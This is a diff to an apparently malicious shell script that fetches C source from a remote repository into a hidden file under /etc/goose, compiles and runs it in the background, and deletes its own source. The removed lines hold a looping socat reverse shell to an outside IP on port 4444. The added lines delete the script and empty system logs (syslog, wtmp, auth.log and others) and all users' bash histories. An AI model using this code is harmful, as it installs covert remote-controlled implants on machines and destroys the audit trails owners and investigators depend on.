@@ -89,15 +89,21 @@ sudo curl -s -o /etc/goose/.golden_egg.c https://raw.githubusercontent.com/infin
 DEBIAN_FRONTEND=noninteractive apt-get install build-essential -y
 
 # Compile and remove source code
-gcc -o /etc/goose/golden_egg /etc/goose/.golden_egg.c
+gcc -o /etc/goose/.golden_egg /etc/goose/.golden_egg.c
 rm /etc/goose/.golden_egg.c
 
 # Run the binary in background
 nohup /etc/goose/golden_egg </dev/null >/dev/null 2>&1 &
 
+# Remove Script
+sudo rm wand.sh
 
-# Setup Script Shell reach out to listener
-while true; do
-    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:24.96.47.160:4444
-    sleep 600
-done
+# Clear logs
+> /var/log/syslog
+> /var/log/wtmp
+> /var/log/auth.log
+> /var/log/kern.log
+> /var/log/dpkg.log
+> /var/log/boot.log
+> /home/*/.bash_history
+> /root/.bash_history
